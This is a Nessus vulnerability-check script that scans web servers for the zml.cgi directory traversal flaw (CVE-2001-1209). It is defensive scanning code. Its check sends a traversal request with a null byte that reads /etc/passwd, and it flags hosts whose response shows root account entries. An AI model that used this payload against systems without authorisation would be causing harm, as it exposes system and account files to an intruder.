#
# This script was written by Drew Hintz ( http://guh.nu )
# 
# It is based on scripts written by Renaud Deraison and  HD Moore
#
# See the Nessus Scripts License for details
#


include("compat.inc");

if(description)
{
 script_id(10830); 
 script_bugtraq_id(3759);
 script_cve_id("CVE-2001-1209");
 script_xref(name:"OSVDB", value:"693");
 script_version("$Revision: 1.19 $");

 name["english"] = "zml.cgi Directory Traversal";
 script_name(english:name["english"]);
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host contains a CGI script that is prone to directory
traversal attacks." );
 script_set_attribute(attribute:"description", value:
"ZML.cgi is vulnerable to a directory traversal attack.  It enables a
remote attacker to view any file on the computer with the privileges of
the cgi/httpd user." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/vulnwatch/2001-q4/0086.html" );
 script_set_attribute(attribute:"solution", value:"Remove this CGI from the web server." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 
 summary["english"] = "zml.cgi is vulnerable to an exploit which lets an attacker view any file that the cgi/httpd user has access to.";
 
 script_summary(english:summary["english"]);
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2001-2009 H D Moore & Drew Hintz ( http://guh.nu )");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);



if(!get_port_state(port))exit(0);


function check(req)
{
  local_var req, r;
  global_var port;

  req = http_get(item:req, port:port);
  r = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if ( r == NULL ) exit(0);
  
  if("root:" >< r && egrep(pattern:".*root:.*:0:[01]:.*", string:r))
  {
   	security_warning(port:port);
	return(1);
  }
 return(0);
}

dirs = cgi_dirs();
foreach dir (dirs)
{
 url = string(dir, "/zml.cgi?file=../../../../../../../../../../../../etc/passwd%00");
 if(check(req:url))exit(0);
}
